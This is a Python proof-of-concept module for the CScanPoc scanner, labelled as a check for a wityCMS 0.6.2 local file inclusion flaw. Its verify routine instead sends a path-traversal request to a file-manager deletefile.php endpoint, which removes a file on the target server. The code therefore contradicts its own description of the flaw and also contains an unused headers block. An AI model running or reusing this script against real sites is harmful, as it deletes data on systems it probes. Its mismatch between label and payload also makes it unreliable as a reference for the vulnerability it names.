# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CNVD-2018-11635' # 平台漏洞编号
    name = 'wityCMS本地文件包含' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2018-06-19'  # 漏洞公布时间
    desc = '''
    wityCMS 0.6.2版本中的/system/WCore/WHelper.php文件存在本地文件包含漏洞。远程攻击者可通过替换helper.json文件利用该漏洞包含本地的PHP文件（执行PHP代码）或读取非PHP文件。
    ''' # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-11635' #
    cnvd_id = 'CNVD-2018-11635' # cnvd漏洞编号
    cve_id = 'CVE-2018-12065'  # cve编号
    product = 'wityCMS'  # 漏洞组件名称
    product_version = '0.6.2'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '2692273d-eb30-44c0-8773-96e5258f3ddb' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/libraries/fileman/php/deletefile.php"
            
            vul_url = arg + payload
            headers = {
                'Content-Type':'application/x-www-form-urlencoded',
            }
            data = 'f=/upload/team/../../helpers/phpmailer/VERSION'
            response = requests.post(vul_url,data=data)

            if response.status_code ==200 and '"res":"ok"' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()